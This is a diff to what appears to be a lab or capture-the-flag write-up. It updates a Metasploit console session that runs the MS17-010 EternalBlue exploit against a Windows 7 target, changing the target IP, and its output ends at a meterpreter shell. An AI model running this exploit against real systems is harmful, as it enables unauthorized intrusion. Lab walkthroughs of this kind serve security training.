@@ -257,20 +257,18 @@ Module options (exploit/windows/smb/ms17_010_eternalblue):
 Use `exploit` or `run` to start the exploitation.
 
 ```console
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.46.162
-RHOSTS => 10.10.46.162
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit                                                                                                                                                                                                                                                                                                                            
-[*] 10.10.46.162:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                                               
-[+] 10.10.46.162:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                                           
-[*] 10.10.46.162:445      - Scanned 1 of 1 hosts (100% complete)                                                                                                                                                       
-[+] 10.10.46.162:445 - The target is vulnerable.                                                                                                                                                                       
-[*] 10.10.46.162:445 - Connecting to target for exploitation.                                                                                                                                                          
-[+] 10.10.46.162:445 - Connection established for exploitation.                                                                                                                                                        
-[+] 10.10.46.162:445 - Target OS selected valid for OS indicated by SMB reply                                                                                                                                                                                                                                                                                        
-[+] 10.10.46.162:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                   
-[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.10.190.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                                               
+[+] 10.10.190.255:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                                           
+[*] 10.10.190.255:445      - Scanned 1 of 1 hosts (100% complete)                                                                                                                                                       
+[+] 10.10.190.255:445 - The target is vulnerable.                                                                                                                                                                       
+[*] 10.10.190.255:445 - Connecting to target for exploitation.                                                                                                                                                          
+[+] 10.10.190.255:445 - Connection established for exploitation.                                                                                                                                                        
+[+] 10.10.190.255:445 - Target OS selected valid for OS indicated by SMB reply                                                                                                                                                                                                                                                                                        
+[+] 10.10.190.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                   
+[+] 10.10.190.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.190.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.190.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 meterpreter > 
 
